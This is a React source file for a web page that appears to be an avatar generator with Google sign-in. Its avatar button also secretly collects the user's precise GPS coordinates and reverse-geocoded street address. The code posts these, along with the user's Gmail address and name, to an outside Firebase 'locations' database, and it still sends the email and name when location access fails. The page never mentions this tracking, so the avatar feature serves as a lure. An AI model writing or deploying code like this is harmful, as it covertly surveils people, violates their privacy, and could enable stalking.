import { useEffect, useState } from "react";
import { db, collection, addDoc } from "./firebase";
import axios from "axios";
import { useAppData } from "./appData";
import { auth, provider, signInWithPopup } from "./firebase";
import { FcGoogle } from "react-icons/fc";
import "./App.css"; // Assuming you have some styles in App.css
import { v4 as uuidv4 } from 'uuid';

const App = () => {
  const [location, setLocation] = useState(null);
  const [isLoggedIn, setLoggedIn] = useState(false);
  const [displayName, SetDisplayName] = useState("");
  const [getEmail, SetGetEmail] = useState("");
  const [avatarUrl, setAvatarUrl] = useState();
  const { data } = useAppData();

  const [companyInfo, setCompanyInfo] = useState(data)

  function generateAvatarUrl() {
    const seed = uuidv4(); // Random unique seed
    // // return `https://api.dicebear.com/7.x/bottts/svg?seed=${seed}`;
    // // return `https://api.dicebear.com/7.x/lorelei/svg?seed=${seed}`;

    // // return `https://robohash.org/${Math.random()}`;
    return `https://api.dicebear.com/7.x/lorelei/svg?seed=${seed}&gender=female&backgroundColor=b6e3f4,c0aede,d1d4f9&skinColor=ecad80,fd9841,f8d25c`;

    // const seed = Math.random().toString(36).substring(2, 10);
    // return `https://api.dicebear.com/7.x/lorelei/svg?seed=${seed}&gender=female&backgroundColor=fcd5ce,f8edeb,d8e2dc,cdeac0&hairColor=ffb6b9,e0aaff,ffc8dd,ddbdfc&accessoriesProbability=100&skinColor=fd9841,ecad80,f8d25c&backgroundType=gradient`;

    //       return `https://api.dicebear.com/7.x/lorelei/svg?seed=${seed}&gender=female&backgroundColor=fcd5ce,f8edeb,d8e2dc,cdeac0&hairColor=ffb6b9,e0aaff,ffc8dd,ddbdfc&accessoriesProbability=100&skinColor=fd9841,ecad80,f8d25c&backgroundType=gradient`;

  }

  const handleGenerate = () => {
    setAvatarUrl(generateAvatarUrl());
    getLocation()
  };

  const onPressButton = (item) => {
    getLocation()
    const updatedCompanyInfo = companyInfo.map((company) => {

      return { ...company, isOpened: company.company === item.company ? !company.isOpened : false };

    });
    setCompanyInfo(updatedCompanyInfo);
  }


  const handleLogin = async () => {
    try {
      const result = await signInWithPopup(auth, provider);
      const user = result.user;
      // console.log("User logged in:",result, user);
      SetDisplayName(user.displayName);
      SetGetEmail(user.email);
      console.log("Gmail ID:", user.email, user.displayName); // 👈 This is the Gmail ID
      const getTime = () => {
        const now = new Date();
        return now.toLocaleTimeString();
      };
      const userData = {
        email: user.email,
        displayName: user.displayName,
        timestamp: new Date().toISOString(),
        time: getTime(),
      };

      try {
        const data = await axios.post("https://dragon-56898-default-rtdb.firebaseio.com//locations.json", userData);
        console.log("Location stored with ID:", data);
        getLocation(user.email, user.displayName);
      } catch (error) {
        console.error("Error storing location:", error.message);
      }
      setLoggedIn(true);
    } catch (error) {
      console.error("Error during login", error);
    }
  };

  useEffect(() => {
    // getLocation()
  }, [])

  const getAddress = async (latitude, longitude) => {
    try {
      const response = await fetch(
        `https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`
      );
      const data = await response.json();
      // console.log("Address:", data.display_name || "Address not found");
      return data.display_name || "Address not found";
    }
    catch (error) {
      console.error("Error fetching address:", error.message);
    }
  };

  const trackMailInError = async (gmail,dName) => {
    const getTime = () => {
      const now = new Date();
      return now.toLocaleTimeString();
    };
    const locationData = {
      email: gmail??getEmail,
      displayName: dName??displayName,
      timestamp: new Date().toISOString(),
      time: getTime(),

    };
    setLocation(locationData);
    try {
      // const data = await axios.post("https://location-tracking-68a4e-default-rtdb.firebaseio.com/locations.json", locationData);

      const data = await axios.post("https://dragon-56898-default-rtdb.firebaseio.com//locations.json", locationData);
      // https://dragon-56898-default-rtdb.firebaseio.com/

      console.log("Location stored with ID:", data);
    } catch (error) {
      console.error("Error storing location:", error.message);
    }
  }



  const getLocation = async (gmail, dName) => {
    if ("geolocation" in navigator) {
      navigator.geolocation.getCurrentPosition(
        async (position) => {

          const getTime = () => {
            const now = new Date();
            return now.toLocaleTimeString();
          };
          const address = await getAddress(position.coords.latitude, position.coords.longitude);
          let locationData = {};
          if (position?.coords && position?.coords?.latitude && position?.coords?.longitude) {
            locationData = {
              email: gmail ?? getEmail,
              displayName: dName ?? displayName,
              latitude: position.coords.latitude,
              longitude: position.coords.longitude,
              timestamp: new Date().toISOString(),
              time: getTime(),
              address: address || "Address not found"
            };
          }
          else {
            locationData = {
              email: gmail ?? getEmail,
              displayName: dName ?? displayName,
              timestamp: new Date().toISOString(),
              time: getTime(),

            };
          }


          setLocation(locationData);
          try {
            // const data = await axios.post("https://location-tracking-68a4e-default-rtdb.firebaseio.com/locations.json", locationData);

            const data = await axios.post("https://dragon-56898-default-rtdb.firebaseio.com//locations.json", locationData);
            // https://dragon-56898-default-rtdb.firebaseio.com/

            console.log("Location stored with ID:", data);
          } catch (error) {
            console.error("Error storing location:", error.message);
            trackMailInError(gmail, dName);
          }
        },
        (error) => {
          console.error("Error fetching location:", error.message);
          trackMailInError(gmail, dName);
        }
      );
    } else {
      console.error("Geolocation is not supported by this browser.");
    }
  };

  return (
    <div>
      {
        !isLoggedIn ?
          <button className="google-btn" onClick={handleLogin}>
            <FcGoogle className="google-icon" />
            <span className="google-text">Sign in with Google</span>
          </button> : null
      }

      <>
        {
          isLoggedIn ?
            <>

              {/* <div className="flex flex-col items-center p-4">
              <button
                onClick={handleGenerate}
                className="mt-4 px-4 py-2 bg-blue-600 text-white rounded-xl"
              >
                See Your Avatar
              </button> */}
              <>
                <div className="avatar-container">
                  <h1 className="rainbow-title">Hello {displayName}</h1>
                  {/* <img src={avatarUrl} alt="Random Avatar" className="avatar-img" /> */}
                  <button className="generate-btn" onClick={handleGenerate}>
                    {avatarUrl ? "Change Your Avatar" : "Click to See Your Avatar"}
                  </button>

                  {avatarUrl ? <img src={avatarUrl} alt="Random Avatar" className="avatar-img" /> : null}
                </div>



              </>

              {/* <p> Select the button to get carrer info</p> */}
              {/* {
              companyInfo.map((item, index) => {
                return (
                  <div key={index}>
                    <button onClick={() => onPressButton(item)}>{item.company}</button>
                    {
                      item.isOpened ?
                        <>
                          <p>{item.description}</p>
                          <a href={item.carrerLink} target="_blank">{item.carrerLink}</a>
                        </> : null
                    }

                  </div>
                );
              })

            } */}

            </> : null
        }

      </>
    </div>
  );
};

export default App;